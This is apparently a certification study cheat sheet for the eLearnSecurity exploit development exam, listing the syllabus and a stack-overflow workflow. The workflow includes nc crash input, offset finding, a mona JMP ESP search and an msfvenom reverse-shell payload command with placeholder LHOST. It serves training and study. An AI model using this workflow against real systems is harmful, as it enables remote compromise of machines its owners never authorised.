# eEDA

**eLearnSecurity Exploit Development Associate** — covers x86 exploit development: stack overflows, SEH, egg hunters, shellcoding, and basic DEP/ASLR bypass.

## Exam Format

- **Duration:** 7 days
- **Format:** Develop a working exploit for a vulnerable Windows application
- **Deliverable:** Exploit code + report

## Syllabus

| Domain | Topics |
|--------|--------|
| Assembly Basics | x86 registers, stack layout, calling conventions, opcodes |
| Stack Overflows | EIP control, offset finding, bad char identification |
| Shellcoding | Writing position-independent shellcode, null-free, alphanumeric |
| SEH Exploits | Structured Exception Handling overwrite, nSEH/SEH chain |
| Egg Hunters | Small shellcode + tag search for larger payload in memory |
| DEP Bypass | ROP chains — VirtualProtect / VirtualAlloc |
| ASLR Bypass | Partial overwrite, info leak, non-ASLR modules |

## Workflow

```python
# 1. Crash the app
python3 -c "print('A'*5000)" | nc target 9999

# 2. Find offset (Metasploit pattern)
msf-pattern_create -l 5000
msf-pattern_offset -q <EIP_value>

# 3. Identify bad characters
badchars = (b"\x01\x02\x03...\xff")

# 4. Find JMP ESP
!mona jmp -r esp -cpb "\x00"

# 5. Generate shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b "\x00" -f python

# 6. Final exploit
payload = b"A" * offset + jmp_esp + b"\x90" * 16 + shellcode
```

## Tools

`immunity debugger` `mona.py` `pwndbg` `msfvenom` `ROPgadget` `windbg`
